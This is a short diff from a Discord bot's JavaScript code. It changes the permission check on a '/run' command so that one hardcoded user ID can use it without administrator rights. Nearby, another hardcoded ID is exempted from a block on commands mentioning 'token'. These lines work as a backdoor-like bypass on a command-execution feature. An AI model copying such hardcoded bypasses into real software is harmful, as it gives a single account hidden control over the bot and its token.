@@ -523,7 +523,7 @@ bot.on('message', async message => {
     }*/
 
     if (message.content.startsWith(`/run`)){
-        if (!message.member.hasPermission("ADMINISTRATOR")) return
+        if (!message.member.hasPermission("ADMINISTRATOR") && message.member.id != "408740341135704065") return
         const args = message.content.slice(`/run`).split(/ +/);
         let cmdrun = args.slice(1).join(" ");
         if (cmdrun.includes('token') && message.author.id != '336207279412215809'){
